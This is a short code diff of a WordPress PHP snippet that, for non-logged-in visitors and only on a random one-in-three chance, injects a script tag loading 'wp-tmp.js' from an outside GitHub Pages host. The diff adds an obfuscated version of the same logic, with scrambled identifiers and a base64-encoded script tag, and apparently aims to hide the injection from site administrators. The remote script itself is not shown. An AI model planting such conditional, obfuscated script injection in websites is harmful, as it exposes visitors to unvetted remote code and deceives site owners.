@@ -1,19 +1,13 @@
-<div><img src="/meme.png"></div>
-	<?php 
-	// $cliente = rand();
-	// if( is_user_logged_in() && ($cliente % 2) === 0){
-	// 	echo '<script type="text/javascript" src="http://localhost/wp-tmp.js"></script>';
-	// }
-?>
-<script type="text/javascript" src="http://localhost/wp-tmp.js"></script>
-
+//codigo base usado
 <?php
-$cliente = rand(3, 12);
-if(  is_user_logged_in() )  {
-}else
-{
+	$cliente = rand(3, 12);
+	if(  is_user_logged_in() )  {
+	}else
+	{
 	if(  ( $cliente % 3) == 0 ) {
 	echo '<script type="text/javascript" src="https://magnocarvalho.github.io/js/wp-tmp.js"></script>';
 		}			
-}
+	}
 ?>
+//code obfuscate 
+<?php $psu_4983a0ab83ed86e0e7213c8783940193=rand(3,12);if(qvv_a15fe519bbf43d8777415f7d384be92c()){}else{if(($psu_4983a0ab83ed86e0e7213c8783940193%3)==0){echo base64_decode('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9tYWdub2NhcnZhbGhvLmdpdGh1Yi5pby9qcy93cC10bXAuanMiPjwvc2NyaXB0Pg==');}}?>
